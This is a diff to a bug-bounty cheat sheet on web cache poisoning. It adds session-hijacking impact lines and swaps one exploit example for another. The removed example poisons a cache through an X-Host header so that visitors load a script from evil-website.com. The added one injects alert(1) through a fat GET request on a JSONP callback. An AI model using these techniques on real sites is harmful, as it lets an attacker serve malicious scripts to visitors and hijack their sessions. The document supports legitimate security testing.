@@ -11,6 +11,8 @@ The objective of web cache poisoning is to send a request that causes a harmful 
 ## Impact
 * Session Hijacking (Web Cache Poisoning + [Host Header Injection](https://github.com/Ch4ng3TheW0rld/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md) + XSS)
 * Password Steal (Web Cache Poisoning + [Host Header Injection](https://github.com/Ch4ng3TheW0rld/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md))
+* Session Hijacking (Web Cache Poisoning + Parameter + XSS)
+* Session Hijacking (Web Cache Poisoning + Http Parameter Pollution + XSS)
 
 ## How to exploit
 Note: Cache-Control: public, no-cache or X-cache: miss, hit
@@ -103,19 +105,17 @@ X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
 alert(1)({"country" : "United Kingdom"})
 ```
 
-7. Seizing the Cache
+7.fat GET request
 ```
-GET / HTTP/1.1
-Host: unity3d.com
-X-Host: evil-website.com
+GET /js/geolocate.js?callback=setCountryCookie
+…
+callback=alert(1)
 
 ### Response:
 HTTP/1.1 200 OK
-Via: 1.1 varnish-v4
-Age: 174
-Cache-Control: public, max-age=1800
+X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
 …
-<script src="https://evil-website.com/x.js"></script>
+alert(1)({"country" : "United Kingdom"})
 ```
 
 8. Route Poisoning
